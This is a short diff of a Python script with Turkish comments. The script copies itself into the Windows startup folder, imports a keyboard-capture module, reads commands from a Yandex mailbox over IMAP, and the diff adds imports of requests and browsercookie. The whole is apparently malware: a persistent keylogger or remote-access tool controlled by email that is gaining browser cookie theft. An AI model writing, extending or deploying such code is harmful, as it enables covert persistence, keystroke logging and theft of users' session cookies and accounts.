@@ -9,13 +9,17 @@ import winshell
 import os
 import sys
 import keyboard
+import requests
+import browsercookie
 startup = winshell.startup()
 source_file = str(sys.argv[0])
 source_file_2 = os.getcwd()+'/'+os.path.basename(__file__)
 destination_file = startup+'/'+os.path.basename(__file__)
 # Sistemin hızlanması için zaman zaman eposta kutusunu temizliyin
-# https://mail.yandex.com/?dpda=yes&uid=1733239543#setup/client
-username = "####@yandex.com"#mail adresiniz
+
+# https://mail.yandex.com/?dpda=yes&uid=1733239543#setup/client
+username = "####@yandex.com"
+#mail adresiniz
 password = "#######"
 def file(filename,kind,data):
   #Eğer dosya okumak istiyorsanız data kısmını boş bırakın
@@ -55,7 +59,8 @@ def read_mail():
 
     mail.select("INBOX")
     _, search_data = mail.search(None, "ALL")
-
+
+
     latest_email_index = search_data[0].split()[-1]
 
     _, msg_data = mail.fetch(latest_email_index, "(RFC822)")
